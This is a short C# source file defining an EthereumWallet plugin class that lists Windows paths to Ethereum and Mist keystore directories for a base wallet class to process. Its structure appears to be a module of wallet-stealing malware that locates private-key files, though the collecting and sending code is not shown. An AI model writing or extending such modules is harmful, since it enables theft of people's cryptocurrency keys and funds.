using System;
using System.Collections.Generic;
using System.IO;

namespace Plugin.Crypto
{
    public class EthereumWallet : CryptoWalletBase
    {
        public EthereumWallet()
        {
            walletName = "Ethereum";
            
            // Ethereum keystore paths
            walletPaths.Add("%APPDATA%\\Ethereum\\keystore");
            walletPaths.Add("%APPDATA%\\Ethereum\\geth\\chaindata");
            
            // Mist wallet
            walletPaths.Add("%APPDATA%\\Mist\\keystore");
        }
    }
}
